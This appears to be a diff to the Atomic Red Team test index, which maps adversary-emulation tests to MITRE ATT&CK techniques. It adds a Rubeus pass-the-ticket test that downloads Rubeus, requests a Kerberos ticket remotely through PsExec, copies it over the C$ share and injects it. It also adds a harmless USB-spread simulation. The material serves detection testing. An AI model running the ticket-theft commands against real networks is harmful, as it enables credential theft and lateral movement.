@@ -32972,6 +32972,74 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Rubeus Kerberos Pass The Ticket
+      auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
+      description: |
+        Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
+        PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.
+      supported_platforms:
+      - windows
+      input_arguments:
+        target:
+          description: Remote system to request the TGT from
+          type: string
+          default: localhost
+        user_name:
+          description: username associated with the ticket (privileged account not
+            required)
+          type: String
+          default: Administrator
+        password:
+          description: password for user_name
+          type: String
+          default: Password
+        domain:
+          description: domain
+          type: String
+          default: "$Env:USERDOMAIN"
+        rubeus_path:
+          description: Path of the Rubeus binary
+          type: Path
+          default: "$Env:TEMP\\rubeus.exe"
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: Url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+        psexec_path:
+          description: Path of the PsExec binary
+          type: String
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Rubeus must exist on disk at specified location (#{rubeus_path})
+
+'
+        prereq_command: 'if (Test-Path #{rubeus_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{rubeus_path}
+
+'
+      - description: 'PsExec must exist on disk at specified location (#{psexec_path})
+
+'
+        prereq_command: 'if (Test-Path #{psexec_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+      executor:
+        name: powershell
+        elevation_required: true
+        command: "#{psexec_path} -accepteula \\\\#{target} -w c:\\ -c #{rubeus_path}
+          asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location
+          $env:TEMP\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host
+          \"Successfully retrieved TGT from '#{target}', now requesting a TGS from
+          local\"\n& \"#{rubeus_path}\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi
+          /ptt\nRemove-Item $env:TEMP\\ticket.kirbi\n& \"#{rubeus_path}\" purge      \n"
   T1556.002:
     technique:
       external_references:
@@ -66249,6 +66317,74 @@ lateral-movement:
 
 '
         name: command_prompt
+    - name: Rubeus Kerberos Pass The Ticket
+      auto_generated_guid: a2fc4ec5-12c6-4fb4-b661-961f23f359cb
+      description: |
+        Requesting a TGT on a remote system and retrieving it locally before requesting a service ticket with it. This is a Pass-The-Ticket attack because the TGT is obtained on the remote system, then used from a different machine (local).
+        PsExec is used to execute commands on the remote system, and the "C$" admin share is used to retrieve the TGT, so the current user must have admin rights remotely and other PsExec prerequisites must be met.
+      supported_platforms:
+      - windows
+      input_arguments:
+        target:
+          description: Remote system to request the TGT from
+          type: string
+          default: localhost
+        user_name:
+          description: username associated with the ticket (privileged account not
+            required)
+          type: String
+          default: Administrator
+        password:
+          description: password for user_name
+          type: String
+          default: Password
+        domain:
+          description: domain
+          type: String
+          default: "$Env:USERDOMAIN"
+        rubeus_path:
+          description: Path of the Rubeus binary
+          type: Path
+          default: "$Env:TEMP\\rubeus.exe"
+        rubeus_url:
+          description: URL of Rubeus executable
+          type: Url
+          default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe
+        psexec_path:
+          description: Path of the PsExec binary
+          type: String
+          default: C:\PSTools\PsExec.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Rubeus must exist on disk at specified location (#{rubeus_path})
+
+'
+        prereq_command: 'if (Test-Path #{rubeus_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-Webrequest -Uri #{rubeus_url} -OutFile #{rubeus_path}
+
+'
+      - description: 'PsExec must exist on disk at specified location (#{psexec_path})
+
+'
+        prereq_command: 'if (Test-Path #{psexec_path}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
+          Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
+          New-Item -ItemType Directory (Split-Path "#{psexec_path}") -Force | Out-Null
+          Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_path}" -Force
+      executor:
+        name: powershell
+        elevation_required: true
+        command: "#{psexec_path} -accepteula \\\\#{target} -w c:\\ -c #{rubeus_path}
+          asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi\nSet-Location
+          $env:TEMP\nMove-Item -Force \"\\\\#{target}\\c$\\ticket.kirbi\" ticket.kirbi\nWrite-Host
+          \"Successfully retrieved TGT from '#{target}', now requesting a TGS from
+          local\"\n& \"#{rubeus_path}\" asktgs /service:cifs/#{target} /ticket:ticket.kirbi
+          /ptt\nRemove-Item $env:TEMP\\ticket.kirbi\n& \"#{rubeus_path}\" purge      \n"
   T1563.002:
     technique:
       external_references:
@@ -66676,7 +66812,30 @@ lateral-movement:
         for code execution
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1091
+    atomic_tests:
+    - name: USB Malware Spread Simulation
+      auto_generated_guid: d44b7297-622c-4be8-ad88-ec40d7563c75
+      description: "Simulates an adversary copying malware to all connected removable
+        drives. \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        command: |
+          $RemovableDrives=@()
+          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
+          ForEach ($Drive in $RemovableDrives)
+          {
+          write-host "Removable Drive Found:" $Drive
+          New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test 1 has created this file to simulate malware spread to removable drives."
+          }
+        cleanup_command: |
+          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
+          ForEach ($Drive in $RemovableDrives)
+          {
+          Remove-Item -Path $Drive\T1091Test1.txt -Force -ErrorAction Ignore
+          }
   T1021.002:
     technique:
       created: '2020-02-11T18:25:28.212Z'
@@ -72841,7 +73000,30 @@ initial-access:
         for code execution
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1091
+    atomic_tests:
+    - name: USB Malware Spread Simulation
+      auto_generated_guid: d44b7297-622c-4be8-ad88-ec40d7563c75
+      description: "Simulates an adversary copying malware to all connected removable
+        drives. \n"
+      supported_platforms:
+      - windows
+      executor:
+        name: powershell
+        command: |
+          $RemovableDrives=@()
+          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
+          ForEach ($Drive in $RemovableDrives)
+          {
+          write-host "Removable Drive Found:" $Drive
+          New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test 1 has created this file to simulate malware spread to removable drives."
+          }
+        cleanup_command: |
+          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
+          ForEach ($Drive in $RemovableDrives)
+          {
+          Remove-Item -Path $Drive\T1091Test1.txt -Force -ErrorAction Ignore
+          }
   T1566.001:
     technique:
       external_references:
